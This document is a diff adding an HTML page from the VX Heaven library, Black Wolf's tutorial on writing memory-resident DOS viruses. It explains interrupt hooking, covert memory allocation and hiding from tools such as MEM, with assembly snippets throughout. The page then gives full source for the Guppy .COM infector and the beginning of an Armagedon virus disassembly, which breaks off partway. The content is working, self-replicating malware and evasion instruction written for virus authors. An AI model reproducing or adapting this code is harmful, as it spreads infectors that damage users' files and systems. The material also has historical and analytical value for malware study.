@@ -1,0 +1,1361 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Black Wolf 'Guide to Memory Resident Viruses' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Black Wolf"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Black Wolf,Guide to Memory Resident Viruses, save, block, ports, error, file, interrupt, memory, check, table, handler, install, filename, word, virus, jump"/>
+<meta name="Description" content="[...] A memory resident program (or TSR for Terminate and Stay Resident) is a program that leaves at least a portion of itself in memory after it terminates and waits for a particular even to take place before it 'activates' again. [...]"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"99c480292e1590f0c2ebad8d9c0849809d8b4476-1498756357-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vbw05.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Guide to Memory Resident Viruses</h1><p><a href="/lib/?lang=en&amp;author=Black%20Wolf"> Black Wolf</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vbw05.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vbw05">Back to index</a>] [<a href="/lib/vbw05.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">INTRODUCTION</a></li>
+<li><a href="#p2">BASICS</a></li>
+<li><a href="#p3">OVERVIEW OF INTERRUPTS</a></li>
+<li><a href="#p4">THE INTERRUPT TABLE</a></li>
+<li><a href="#p5">HOOKING INTERRUPTS</a></li>
+<li><a href="#p6">ALTERNATIVE METHOD</a></li>
+<li><a href="#p7">ALLOCATING MEMORY</a></li>
+<li><a href="#p8">BLANK SPACES</a></li>
+<li><a href="#p9">BOOT SECTORS</a></li>
+<li><a href="#pa">DOS MEMORY STRUCTURES</a></li>
+<li><a href="#pb">PSP AND MCB's</a></li>
+<li><a href="#pc">BIOS/PSP METHOD</a></li>
+<li><a href="#pd">ALLOCATING WITH DOS</a></li>
+<li><a href="#pe">DIRECT MANIPULATION</a></li>
+<li><a href="#pf">SELF RECOGNITION</a></li>
+<li><a href="#pg">COPYING THE VIRUS</a></li>
+</ul>
+<h2><a name="p1">INTRODUCTION</a></h2>
+<p>A memory resident program (or TSR for Terminate and Stay Resident) is a program that leaves at least a portion of itself in memory after it terminates and waits for a particular even to take place before it 'activates' again. With DOS, this generally means that it hooks interrupts (BIOS/DOS function calls) and waits for a specific keystroke, I/O command, time, etc. While this can be useful in many types of programs, it is especially important in viral programming. A virus that remains in memory can spread faster and protect itself through 'stealth' abilities that non-resident viruses cannot have. This text will take you through several methods of memory resident programming for viruses, assuming a decent level of competency in 8086/8088 assembly language.</p>
+<h2><a name="p2">BASICS</a></h2>
+<p>For starters, we need to know what a program has to do to go memory resident. This can be summed up in 3 basic steps:</p>
+<ol>
+<li>Allocate some memory that will NOT be deallocated after the virus terminates. This is necessary so that the virus will not be overwritten.</li>
+<li>Copy the virus to the allocated memory.</li>
+<li>Set up a method in which the virus will eventually be activated, generally by hooking BIOS or DOS interrupts.</li>
+</ol>
+<h2><a name="p3">OVERVIEW OF INTERRUPTS</a></h2>
+<p>The first thing that we need to know is how interrupts work. Interrupts are mainly BIOS and DOS subroutines (functions) that can be called by a program (example: Int 21h is the main file I/O interrupt). To use them, all one has to do is set up the registers for the desired purpose and execute an INT XX, where XX is the interrupt number between 1 and 255. What the computer does first when it hits this instruction is push all of the flags (PUSHF), then it consults a table at the bottom of memory and executes a far call to the address of the appropriate interrupt. When the interrupt is done, it returns to the program by executing an IRET (interrupt return), which is a combination of a RETF and a POPF. To set the interrupt, then, merely takes changing that table. If you want to return to the original handler after your code runs, however, you must also save the old values and jump there when your code is done. This is absolutely neccessary with handlers like INT 21h, for otherwise nothing that DOS does through this will get done, and the computer will crash.</p>
+<h2><a name="p4">THE INTERRUPT TABLE</a></h2>
+<p>The Interrupt Table is a table of addresses for the interrupt handler code of each interrupt. It is located at 0000:0000 and ends at 0000:0400. Each entry is 4 bytes long, consisting of a word long pointer to the offset of the handler followed by a word pointer to the segment of the handler. This setup allows you to calculate the address of an interrupt address by taking the entry number and multiplying it by 4. For example, the Int 21h address (the major DOS Interrupt) is located at 0000:0084 (21h*4). There is a space at the end of the interrupt table allocated for user programs to set up their own interrupts and for later expansion. This is basically the upper half, starting at 0000:0200. On my system at least, this is generally free up until about 0000:03A0 or so, leaving 1A0h bytes for you to use if you want for whatever. This will be look into in more depth later on.....</p>
+<h2><a name="p5">HOOKING INTERRUPTS</a></h2>
+<p>There are two basic ways to hook interrupts. The first, using DOS, is done with Int 21h, functions 35h (Get Interrupt Address) and 25h (Set Int). First what you want to do is call Int 21h with the following setup:</p>
+<pre class="source">
+AH = 35h (Get Interrupt Vector)
+AL = Interrupt Number
+
+It returns the following:
+
+AX = Unchanged
+ES = Interrupt Handler Segment
+BX = Interrupt Handler Offset
+</pre>
+<p>What you want to do then is store the ES:BX address so that it can be used later, and then set the interrupt to point to your handler. To do this call Int 21h again as follows:</p>
+<pre class="source">
+AH = 25h (Set Interrupt Vector)
+AL = Interrupt Number
+DS = New Handler Segment
+DX = New Handler Offset
+</pre>
+<p>Now that your interrupt is set, you have to do something with it. Here is a basic model for an interrupt hooker with a handler that returns control to the original handler after it is done:</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+;Assume that DS = CS as in a .COM file.
+
+Get_Interrupt_Address:
+		mov ax,3521h				;Get Old Int 21h Address
+		int 21h
+
+		mov word ptr [Int_21_Segment],es	;Save old address
+		mov word ptr [Int_21_Offset],bx
+
+Set_Interrupt_Address:
+		mov ax,2521h
+		mov dx,offset Int_21_Handler		;DS:DX = Int_21_Handler
+		int 21h					;Set the new handler
+
+;*********** Continue on with program, exit, whatever
+
+Int_21_Handler:
+		cmp ah,4bh				;Check for activation
+		je execute_a_program			;conditions by looking
+		cmp ah,3dh				;at the function numbers
+		je open_a_file				;of Int 21 that you wish
+							;to intercept. Make sure
+							;to save any registers that
+							;you change inside the
+							;various handlers!!!!!!
+Go_Int_21:
+		db 0eah					;This simulates a far jump
+Int_21_Offset	dw 0					;to the old interrupt handler.
+Int_21_Segment	dw 0					;(0EAh is code for a far jmp.)
+;----------------------------------------------------------------------------
+</pre>
+<p>Notice the trick in Go_Int_21 with the 0EAh. What that does is simulate a far jump to the old handler once your handler is done. A couple of other things that one must do when an interrupt is hooked are as follows:</p>
+<ol>
+<li>Make sure to push/pop any registers that get changed!!!!! Otherwise the results are unpredictable.</li>
+<li>Make sure that your interrupt handler does not call the function that is has hooked directly. I.E. if you hook Int 21h, function 3dh to open files, do not put an Int 21h, function 3dh inside the handler for it, as it will call the handler again, and again, and again...... Instead, call the interrupt indirectly by calling the ORIGINAL address with code like the following:
+<pre class="source">
+Call_Int_21h:
+		pushf				;push the flags and perform
+		call dword ptr [Int_21_Offset]	;a far call to simulate an
+						;INT call.
+</pre></li>
+</ol>
+<h2><a name="p6">ALTERNATIVE METHOD</a></h2>
+<p>The other way to hook interrupts is by directly changing the table. This can be done very easily, but you MUST remember to disable the interrupts before doing so, then enable them afterwords. Otherwise, the interrupt could possibly be called when only half of the address was set, creating unpredictable results. See the following example:</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+Set_DS_to_Table:				;DS = 0
+		xor ax,ax
+		mov ds,ax
+
+Hook_Int_21:
+		mov ax,offset Int_21_Handler	;ax = Handler Offset
+		mov bx,cs			;bx = Handler Segment
+
+		cli				;clear interrupts
+		xchg ax,word ptr ds:[84h]	;Set AX = Old handler offset
+						;and set new offset.
+		xchg bx,word ptr ds:[86h]	;Set BX = Old handler segment
+						;and set new segment.
+		mov word ptr cs:[Int_21_Offset],ax
+		mov word ptr cs:[Int_21_Segment],bx
+		sti				;restore interrupts
+
+		push cs
+		pop ds				;restore DS = CS
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="p7">ALLOCATING MEMORY</a></h2>
+<p>Okay, now that we know exactly how interrupts work, let's take a look at some ways to allocate memory for the virus. What we need is a space large enough for our virus to fit in and work that will not be deallocated after an infected program is terminated. There are several ways in which to do this. One can use Int 27h as a regular program would, but this would cause the entire program to halt, alerting any user with a brain that something is wrong. One can, however, make a virus that either re-executes the host so that the termination is not seen (as Armageddon the Greek does) or one can make it only go TSR the first time (duh) and allow the program to execute fine afterwards (like Guppy and Little Brother do). The methods for these are pretty simple and can be gained by examining the disassemblies of Guppy and Armageddon included with this file.</p>
+<h2><a name="p8">BLANK SPACES</a></h2>
+<p>The next simple method to go memory resident is to find a blank area in memory that will NOT be used and use it. For really small virii, one can use the top half of the interrupt table (mentioned earlier) in the manner that the Micro-128 virus does (see disassembly). Other locations, such as video memory (0b000/0b800) can be used as well if one keeps it on an unused page (risky, but 0b900 will work for a while....). Leapfrog, for instance, stores itself in one of DOS's disk buffers. The only code for this is to copy the virus to the unused memory and make sure to point the handler to the NEW copy.</p>
+<h2><a name="p9">BOOT SECTORS</a></h2>
+<p>One slight variation on this is the code that boot sector viruses such as Stoned and Michelangelo use to allocate memory. Before DOS has booted (and even later, as we will talk about later) BIOS stores the amount of usable lower memory in a word located at 0:413h in memory. This word contains the number of usable K, starting at 0000:0000 and ending (at the highest) at A000:0000. One can reserve space for a virus by subtracting the number by the number of K needed (round up). Then, to find the segment address, multiply the new value by 64 (40h) to convert it into paragraphs. This is your free area. Copy the virus to here, then set the interrupts to point to its handlers. When DOS boots it will reserve this area as allocated and CHKDSK will return 1K less low memory (assuming you use 1K). Here is an example of this technique:</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+Get_Current_Amount:
+		xor ax,ax
+		mov ds,ax
+		mov ax,word ptr ds:[413h]	;ax = memory in K
+
+Reserve_Memory:
+		dec ax
+		mov word ptr ds:[413h],ax	;lower memory by 1K
+
+Calculate_Free_Segment:
+		mov cl,06
+		shl ax,cl			;AX = AX * 64
+		mov es,ax			;ES:0 is now the beginning
+						;of free memory.
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="pa">DOS MEMORY STRUCTURES</a></h2>
+<p>Unfortunately, the last method only works before DOS is loaded. While this is great for bootsector and multi-partite viruses, it doesn't work very well for file-oriented viruses that load under DOS. For these, we need to know more about the memory structures that DOS uses, namely the Memory Control Blocks (MCB's) and the Program Segment Prefix (PSP).</p>
+<h2><a name="pb">PSP AND MCB's</a></h2>
+<p>When a file is loaded to be executed under DOS, DOS first takes the memory it will allocate to the file and starts it with a 16 byte header called a Memory Control Block. This header tells DOS the owner of the block of memory, the size of the block, and whether it is the last in a chain of MCB's or not. DOS the loads a 256 byte table called the Program Segment Prefix directly after the MCB. The PSP is basically a table of information for DOS book-keeping, including the location of the top of usable memory by DOS. This also holds the default DTA, FCB's, and command lines for programs Directly after the PSP, DOS loads the program to be run. If it is a .COM file, it will be loaded and run where CS:0 = the beginning of the PSP, making the beginning of the file start at an offset of 100h. If it is an .EXE file, the beginning of the file will be loaded at CS:0, where CS is 10h higher than the PSP's segment. This is important to remember when trying to modify the PSP from a program. The MCB, as said above, is 10h lower in memory than the PSP, or one segment lower. Full tables of each structure are shown below.</p>
+<p>The format of a Memory Control Block is as follows:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="DOS Memomy Control Block">
+<tr><th colspan="4">Memory Control Blocks</th></tr>
+<tr><th>Offset</th><th>Name</th><th>Length (Bytes)</th><th>Description</th></tr>
+<tr><td>0</td><td>Location</td><td>1</td><td>M=Last Block, Z=Not Last</td></tr>
+<tr><td>1</td><td>Owner</td><td>2</td><td>Segment of start of Memory</td></tr>
+<tr><td>3</td><td>Size</td><td>2</td><td>Length in Paragraphs</td></tr>
+<tr><td>5</td><td>Unknown</td><td>3</td><td>Supposedly Reserved</td></tr>
+<tr><td>8</td><td>Owner's Name</td><td>8</td><td>Name. Appears in mem maps</td></tr>
+</table>
+<p>The format of DOS's Program Segment Prefix is as follows:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="DOS's Program Segment Prefix">
+<tr><th colspan="4">Program Segment Prefix</th></tr>
+<tr><th>Offset</th><th>Name</th><th>Length (Bytes)</th><th>Description</th></tr>
+<tr><td>00</td><td>Terminate</td><td>2</td><td>CD20 (Int 20)</td></tr>
+<tr><td>02</td><td>Top of Memory</td><td>2</td><td>Usually set at A000. Sometimes needed to lower DOS's memory for a virus.</td></tr>
+<tr><td>04</td><td>Unknown</td><td>1</td><td>Supposedly Reserved.</td></tr>
+<tr><td>05</td><td>CPM stuff</td><td>5</td><td>Obsolete</td></tr>
+<tr><td>0A</td><td>Exit to DOS</td><td>4</td><td>Int 22h handler (IP:CS)</td></tr>
+<tr><td>0E</td><td>Control C Handler</td><td>4</td><td>Int 23h handler (IP:CS)</td></tr>
+<tr><td>12</td><td>Critical Error</td><td>4</td><td>Int 24h handler (IP:CS)</td></tr>
+<tr><td>16</td><td>Parent ID</td><td>2</td><td>Segment of Parent Prog.</td></tr>
+<tr><td>18</td><td>Handle Table</td><td>14</td><td>One byte/handle</td></tr>
+<tr><td>2C</td><td>Environment Segment</td><td>2</td><td>Segment of Envir. Vars.</td></tr>
+<tr><td>2E</td><td>User Stack</td><td>4</td><td>Stack address</td></tr>
+<tr><td>32</td><td>File Handle Count</td><td>2</td><td>Size of Handle Table</td></tr>
+<tr><td>34</td><td>Handle Table Address</td><td>4</td><td>If not at 12h</td></tr>
+<tr><td>38</td><td>Unknown</td><td>1c</td><td>Supposedly Reserved</td></tr>
+<tr><td>50</td><td>Dos Call and RET</td><td>3</td><td>INT 21, RET</td></tr>
+<tr><td>53</td><td>Unknown</td><td>9</td><td>Supposedly Reserved</td></tr>
+<tr><td>5C</td><td>FCB 1</td><td>10</td><td>File Control Block</td></tr>
+<tr><td>6C</td><td>FCB 2</td><td>10</td><td>""</td></tr>
+<tr><td>7C</td><td>Unknown</td><td>4</td><td>Reserved</td></tr>
+<tr><td>80</td><td>Command Line Length</td><td>1</td><td>Also used as the</td></tr>
+<tr><td>81</td><td>Command Line</td><td>7f</td><td>default DTA.</td></tr>
+</table>
+<p>Using this information, there are two basic ways to go memory resident. The first is to tell DOS that its top of memory is one or two K less, lowering the MCB memory to correspond, then lowering the BIOS memory as shown before. This method allows the virus to go memory resident using a small amount of code, and it prevents it from showing up on MEM's list of memory holders. Unfortunately, a decrease in lower memory is quite obvious using programs like CHKDSK and MEM. The other method is to create another memory block than the host's, setting the owner to either itself or, most commonly, COMMAND.COM. This can be done either using DOS memory functions, as most viruses do, or it can be done directly by manipulating the MCB's themselves.</p>
+<h2><a name="pc">BIOS/PSP METHOD</a></h2>
+<p>The first and simplest method is to lower DOS's top of memory field in the PSP, shrink the file's MCB, and lower the memory allocated to DOS by BIOS. The end result of this is an area at the top of low memory that is unallocated and can be used. One of the disadvantages of this is that the size of the block MUST be allocated in chunks of 1K because the BIOS memory field stores size in 1K blocks. This method is quite similair to that used in the bootsector example above. See the example below:</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+;This example assumes .COM file structure where DS = CS = PSP.
+
+Get_And_Lower_Top_Of_Memory:
+		mov ax,word ptr ds:[02]		;Get Top of Memory (PSP)
+		sub ax,40h			;Lower it by 1K (40h paragraphs)
+		mov word ptr ds:[02],ax		;And Replace Value.
+
+Get_MCB_Segment:
+		mov ax,ds			;AX = CS = DS
+		dec ax				;Get Segment of MCB
+		mov ds,ax			;And put into DS
+
+Shrink_Block:
+		sub word ptr ds:[03],40h	;Subtract 1K from host's MCB
+						;allocation (paragraphs)
+Allocate_From_Bios:
+		xor ax,ax
+		mov ds,ax			;DS = 0
+		dec word ptr ds:[413h]		;Allocate 1K from Bios
+
+Find_Free_Segment:
+		mov ax,word ptr ds:[413h]	;Get memory in 1K
+		mov cl,6
+		shl ax,cl			;change to segment (multiply
+						;by 64 or 40h)
+
+						;AX now equals free segment
+						;of memory
+
+		mov es,ax			;Set ES = Free Segment
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="pd">ALLOCATING WITH DOS</a></h2>
+<p>Using DOS to allocate memory for you is often the method of choice for virus writers. To do this, first find the maximum block size avaliable by calling INT 21h, function 4Ah (Modify Memory Allocation) with the requested memory (In paragraphs) set to 0ffffh. Since this is impossible, it will return a carry flag and put the maximum size in BX. Subtract this amount by the number of paragraphs that you want (+1 for safety) and then execute another function 4Ah with the new value for BX. This will shrink the block and give you enough space for the virus at the top of memory. Allocate memory for the virus using Int 21h, function 48h (Allocate Memory) with BX set to the number of paragraphs you want (no +1 this time). This will return the segment of free memory in AX. All that is left now is to mark the new block as the last in the chain by setting the first byte in its MCB to 'Z', and change its owner. The owner is usually a word value corresponding to the program's PSP (MCB Seg+1). This will work, or you can set it to a reserved value like 08 (I/O). After this is done, if you want, you can set the owner's name field starting at MCB_SEG:0008 to any eight byte or smaller name. This name will appear in memory mapping programs such as MEM and SI.</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+Get_Maximum_Memory:
+		mov ah,4ah
+		mov bx,0ffffh			;Request too much
+		int 21h				;memory - maximum size
+						;returned in BX.
+Subtract_Needed_Memory:
+		sub bx,((end_vir-start_vir+0fh)/10h)*2+1
+						;Shrink Block by
+						;(virsize*2)+1
+
+Shrink_Block:					;BX = Paragraphs
+		mov ah,4ah			; Requested
+		int 21h				;ES = Segment of Block
+
+Allocate_Memory:
+		mov ah,48h
+		mov bx,((end_vir-start_vir+0fh)/10h)*2
+						;Allocate (virsize*2)
+		int 21h				;Returns AX = Free Seg
+
+Point_ES_to_New_MCB:
+		dec ax
+		mov es,ax
+		inc ax
+
+Set_As_Last_Block:
+		mov byte ptr es:[0],'Z'		;Mark as last
+						;in chain
+Set_Owner:
+; Note: The number in the Owner field is usually the segment of the program's
+; PSP. Certain values, however, have special meanings. 08, for example,
+; indicates I/O or Command.COM as the owner. This can be useful for
+; deceptions. The only requirement of this is that the owner will NOT
+; be deallocated.
+
+		mov word ptr es:[1],ax		;Set owner as itself.
+
+Set_Name:
+;Note: This is not necessary, but it can be used for many purposes.
+
+		mov di,08			;ES:DI = owner name
+						;DOS 4+
+		mov si,offset virname
+		push cs
+		pop ds
+		mov cx,4
+		repnz movsw			;Copy name into field.
+;This will show up in programs like MEM and
+;System Information.
+
+
+............. ;Continue program, hook interrupts, etc.
+
+virname db 'reMEMber'
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="pe">DIRECT MANIPULATION</a></h2>
+<p>Direct Manipulation is basically the same in the end result as DOS manipulation, but the steps are executed (obviously) completely differently. One advantage of this method is that one can determine whether or not to allow DOS to display the block the virus is in (see notes in code). Since the steps are basically the same, see the code for how each is done.</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+Get_Maximum_Memory:
+		mov ax,ds
+		dec ax
+		mov ds,ax			;DS = MCB
+		mov bx,word ptr ds:[03]		;Get Block Size
+
+Subtract_Needed_Memory:
+		sub bx,((end_vir-start_vir+0fh)/10h)*2+1
+						;Shrink Block by
+						;(virsize*2)+1
+Shrink_Block:
+		mov word ptr ds:[03h],bx	;Lower Block Size
+
+;----------------------------------------------------------------------------
+; Note: If you want your program to show up in a memory map, set this byte
+; to 'M', meaning that it is NOT the last block. Otherwise, set it
+; to 'Z' so that MEM and like programs will not trace past it.
+;----------------------------------------------------------------------------
+		mov byte ptr ds:[0],'M'		;Mark host block's
+						;location in chain.
+
+Lower_Top_Of_Memory:				;Lower field in PSP
+		sub word ptr ds:[12h],((end_vir-start_vir+0fh)/10h)*2+1
+
+Point_ES_to_New_MCB:				;Get New top of mem
+		mov ax,word ptr ds:[12]		;from PSP.
+		mov es,ax			;ES = new segment.
+
+Set_As_Last_Block:
+		mov byte ptr es:[0],'Z'		;Mark as last
+						;in chain
+Set_Owner:
+		mov word ptr es:[1],ax		;Set owner as itself.
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="pf">SELF RECOGNITION</a></h2>
+<p>One thing that a virus must do to remain unnoticed to any degree is to recognize if it has already been installed so that it does not continue to re-install itself, taking up more and more memory. The simplest way to do this is to hook an interrupt and check for a certain unique value, or an installation check, and return another unique value if one is received to tell the executing virus that it is already in memory. For example, one can hook INT 21h and wait for AX to be equalled to DEADh on entry. In such a case, one could save the value and IRET. If the virus is not installed, the result will be AX = DE00. The executing virus would then check to see if the value was correct and, if so, return control to the host without re-installing itself.</p>
+<p>See the code below:</p>
+<pre class="source">
+;----------------------------------------------------------------------------
+Install_Check:
+		mov ax,0deadh
+		int 21h				;Is it installed?
+		cmp ax,0deadh
+		je Already_Installed		;Yes? jump to Already_Installed
+Install:					;otherwise install it.
+..........
+
+Int_21_Handler:
+		cmp ah,4bh
+		je execute
+		cmp ah,3dh
+		je open
+		cmp ax,0deadh			;Is it an install check?
+		je Install_Check		;Yes, jump to Install_Check.
+Go_Int_21:
+		db 0ea
+Int_21_IP	dw 0
+Int_21_CS	dw 0
+
+Install_Check:					;Save value in AX
+iret
+;----------------------------------------------------------------------------
+</pre>
+<h2><a name="pg">COPYING THE VIRUS</a></h2>
+<p>One point that has been more or left out up until now is how to copy the virus. The simplest (and the only REAL way) is to set ES:DI to the newly allocated space, DS:SI to the start of the virus, and CX to the length of the virus in words (or bytes if you wish to use movsb). Then execute a REPNZ MOVSW and you've got it. Note: When using Int 27, this is uneccessary because it puts the program into memory at it's original location.</p>
+<pre class="source">
+;***************************************************************************
+;*                          The Guppy Virus                                *
+;***************************************************************************
+;*      The Guppy virus is a relatively simple, very small, resident .COM  *
+;*infector.  It uses the standard way for a regular program to go resident *
+;*(i.e. Int 27) which makes the infected program terminate the first time  *
+;*run.  After that, however, infected files will run perfectly.  This virus*
+;*uses interesting methods to restore the storage bytes, as well as a      *
+;*strange technique to restore control to an infected file after it has    *
+;*already gone memory resident.                                            *
+;*                                                                         *
+;*Note: The Guppy virus was originally assembled with an assembler other   *
+;*      than Tasm, so to keep it exactly the same some commands must be    *
+;*      entered directly as individual bytes.  In these cases, the command * 
+;*      is commented out and the bytes are found below it.                 *
+;*                                                                         *
+;***************************************************************************
+
+.model tiny                
+.radix 16
+.code
+
+		org     100h
+start:
+		call    Get_Offset
+  
+Get_Offset:
+		pop     si                 ;SI = offset of vir + 
+					   ;(Get_Offset-Start)
+		mov     ax,3521h
+		mov     bx,ax
+		int     21h                ;Get Int 21 Address
+			   
+		mov     ds:[si+Int_21_Offset-103],bx      ;Save old Int 21 
+		mov     ds:[si+Int_21_Segment-103],es      
+		
+		;mov     dx,si             ;Bytes vary between assemblers     
+		db      89,0f2
+		
+		;add     dx,offset Int_21_Handler-104
+		db      83,0c2,1f
+
+		mov     ah,25h
+		int     21h                ;Set Int 21
+						
+		inc     dh                 ;Add 100h bytes to go resident
+					   ;from handler
+		push    cs              
+		pop     es
+		int     27h                ;Terminate &amp; stay resident
+					   ;DX+1 = end of area to go res.
+
+
+Int_21_Handler:                
+		cmp     ax,4B00h           ;Is call a Load &amp; Execute?
+		je      Infect             ;Yes? Jump Infect
+		
+		cmp     al,21h             ;Might it be a residency check? 
+		jne     Go_Int_21          ;No? Restore control to Int 21     
+		
+		;cmp     ax,bx             ;Are AX and BX the same?
+		db      39,0d8
+
+		jne     Go_Int_21          ;No, Restore control to Int 21
+
+		push    word ptr [si+3dh]  ;3dh = offset of Storage_Bytes -  
+					   ;Get_Offset
+
+					   ;This gets the first word of 
+					   ;storage bytes, which is then 
+					   ;popped to CS:100 to restore it.
+					    
+		mov     bx,offset ds:[100] ;100 = Beginning of COM
+		pop     word ptr [bx]      
+
+		mov     cl,[si+3Fh]        ;Restore third storage byte.
+		mov     [bx+2],cl
+
+Restore_Control:                
+		pop     cx
+		push    bx
+		iret                            ;Jump back to Host program.
+		
+Storage_Bytes         db      0, 0, 0
+
+Infect:
+		push    ax
+		push    bx
+		push    dx
+		push    ds
+		mov     ax,3D02h
+		int     21h             ;Open File for Read/Write Access
+				      
+		xchg    ax,bx
+		call    Get_Offset_Two
+
+Get_Offset_Two:
+		pop     si
+		push    cs
+		pop     ds
+		mov     ah,3F
+		mov     cx,3
+		sub     si,10           ;Set SI=Storage_Bytes
+		
+		;mov     dx,si
+		db      89,0f2
+
+		int     21h             ;Read first 3 bytes of file
+				       
+		cmp     byte ptr [si],0E9h      ;Is the first command a jump?
+		jne     Close_File                   ;No? Jump to Close_File
+		mov     ax,4202h
+		xor     dx,dx
+		xor     cx,cx
+		int     21h                     ;Go to end of file
+						
+		xchg    ax,di
+		mov     ah,40h                  
+		mov     cl,98h                  ;Virus Size
+
+		;mov     dx,si
+		db      89,0f2
+		
+		sub     dx,40h                  ;Beginning of virus
+		int     21h                     ;Append virus to new host
+						
+		mov     ax,4200h
+		xor     cx,cx
+		xor     dx,dx
+		int     21h                     ;Go back to beginning of file
+			    
+		mov     cl,3
+		
+		;sub     di,cx
+		db      29,0cf
+
+		mov     [si+1],di
+		mov     ah,40h
+		
+		;mov     dx,si
+		db      89,0f2
+		
+		int     21h                     ;Write 3 byte jump to file
+						
+Close_File:
+		mov     ah,3Eh
+		int     21h
+			    
+		pop     ds
+		pop     dx
+		pop     bx
+		pop     ax
+Go_Int_21:
+		db      0EAh                    ;Go On With Int 21
+Int_21_Offset   dw      ?
+Int_21_Segment  dw      ?
+
+end     start
+;**************************************************************************
+
+
+
+;***************************************************************************
+;*                           The Armagedon Virus                           *
+;*                                                                         *
+;*Dial is controlled off of the new INT 08 handler when virus goes TSR.    *
+;*Examine the way the virus goes memory resident using INT 27, this is an  *
+;*interesting method that I had not seen before in a virus.  Also, look    *
+;*at its rather strange procedure for infecting files.                     *
+;*                                                                         *
+;*                         Disassembly by Black Wolf                       *
+;*                                                                         *
+;* (The 911 virus is directly related to this one, as the only differences *  
+;*         are in the numbers dialed and the text messages)                *
+;***************************************************************************
+.model tiny                             ;Sets assembler into Tiny mode
+.radix 16                               ;Sets numbers to hexidecimal
+.code
+	org     100
+
+;**************************************************************************
+;*                             Loading Jump                               *
+;**************************************************************************
+start:
+		jmp     Virus_Entry
+
+;**************************************************************************
+
+
+;**************************************************************************
+;*              This is where the infected file would usually be.         *
+;**************************************************************************
+;**************************************************************************
+
+
+;**************************************************************************
+;*                              Int 21 Handler                            *
+;**************************************************************************
+Int_21:
+		pushf
+		cmp     ah,0E0          ;Is this an installation check?
+		jne     not_check       ;If not, go to not_check
+		mov     ax,0DADA        ;If so, return 0DADA
+		popf                    ;and exit interrupt.
+		iret
+  
+not_check:
+		cmp     ah,0E1          ;0E1=request for virus' seg. address
+		jne     not_seg_req     ;Not E1? then go to not_seg_req
+		mov     ax,cs           ;Move virus' address into AX
+		popf                    ;and exit interrupt.
+		iret
+not_seg_req:
+		cmp     ax,4B00         ;Load and Execute?
+		je      Infect          ;Go Infect
+Go_Int_21:
+		popf
+
+;               jmp     dword ptr cs:[Int_21_Off]  
